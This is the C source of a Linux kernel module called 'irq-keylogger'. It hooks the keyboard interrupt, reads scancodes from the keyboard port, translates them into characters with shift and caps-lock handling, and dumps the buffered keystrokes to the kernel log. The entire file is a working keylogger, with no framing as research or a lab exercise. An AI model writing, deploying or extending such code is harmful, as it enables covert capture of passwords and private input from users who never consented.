#include <asm/io.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/string.h>

#include "keylogger.h"

MODULE_AUTHOR("George Malandrakis");
MODULE_DESCRIPTION("irq-keylogger");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

//#pragma GCC push_options
//#pragma GCC optimize ("O0")

static volatile char buf[BUF_LEN];
static volatile int table_offset = 0;
static volatile int i = 0;
static volatile int right_shift = 0;
static volatile int left_shift = 0;

struct logger_data {
    unsigned char scancode;
} ld;
const char *name = "irq-keylogger";

static void nullify_contents(void) {
    int l;
    for (l = 0; l < BUF_LEN; l++) {
        buf[l] = 0x0;
    }
    return;
}

static int general_controls(long scancode) {
    switch (scancode) {
        case 42:  // left shift pressed
            if (left_shift == 0) {
                table_offset = table_offset ^ 90;
                left_shift = 1;
            }
            return 1;
        case 54:  // right shift pressed
            if (right_shift == 0) {
                table_offset = table_offset ^ 90;
                right_shift = 1;
            }
            return 1;
        case 58:  // caps lock pressed
            table_offset = table_offset ^ 90;
            return 1;
        case 170:  // left shift released
            table_offset = table_offset ^ 90;
            left_shift = 0;
            return 1;
        case 182:  // right shift released
            table_offset = table_offset ^ 90;
            right_shift = 0;
            return 1;
        case 250:
        case 186:      // caps lock released
            return 1;  // ignore
        default:
            return 0;
    }
}

irq_handler_t interrupt_handler(int irq, void *dev_id, struct pt_regs *regs) {
    unsigned long scancode = inb(0x60);

    int ret = general_controls(scancode);
    if (ret) {
        return (irq_handler_t)IRQ_HANDLED;
    }

    if (scancode & 0x80) {           // Key released
        scancode = scancode & 0x7F;  // unset highest bit

        buf[i] = keyboard_map[scancode + table_offset];
        ++i;
    }

    if (i == BUF_LEN - 1) {
        printk("User wrote: %s", buf);
        nullify_contents();
        i = 0;
    }
    return (irq_handler_t)IRQ_HANDLED;
}

//#pragma GCC pop_options

int __init keylogger_init(void) {
    int ret;
    ret = request_irq(1, (irq_handler_t)interrupt_handler, IRQF_SHARED, name,
                      &ld);
    if (ret != 0) {
        printk(KERN_INFO "IRQ request failed.\n");
    }

    return ret;
}

void __exit keylogger_exit(void) { free_irq(1, &ld); }

module_init(keylogger_init);
module_exit(keylogger_exit);
